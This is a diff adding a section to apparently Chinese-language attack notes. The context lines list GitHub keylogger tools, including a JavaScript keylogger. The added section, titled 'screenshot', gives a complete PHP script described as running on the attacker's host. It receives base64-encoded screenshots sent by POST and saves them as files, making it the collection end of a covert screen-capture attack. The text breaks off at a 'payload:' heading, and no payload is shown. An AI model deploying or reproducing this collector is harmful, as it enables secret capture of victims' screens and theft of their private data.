@@ -134,3 +134,42 @@ GitHub tools:
 [keylogger](https://github.com/rajeshmajumdar/keylogger)
 
 [JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
+
+## 4.屏幕截图
+
+攻击者主机screenshot.php
+```php
+<?php
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+//确保脚本仅处理POST请求
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    //POST请求中的参数为screenshot
+    $encodedImage = $_POST['screenshot'];
+
+    //解码POST请求中的数据
+    $exploded = explode(',', $encodedImage, 2);
+
+    if (count($exploded) == 2) {
+        $encodedImageData = $exploded[1];
+            $decodedImageData = base64_decode($encodedImageData);
+        //为保存的文件使用唯一名，以避免冲突
+        $fileName = uniqid('screenshot_', true) . '.jpeg';
+
+        //保存图片
+        if (file_put_contents($fileName, $decodedImageData) !== false) {
+            echo "Screenshot saved successfully as {$fileName}.";
+        } else {
+            echo "Failed to save screenshot.";
+        }
+    } else {
+        echo "Received data is not in expected format.";
+    }
+} else {
+    echo "This script only handles POST requests.";
+}
+?>
+```
+
+payload:
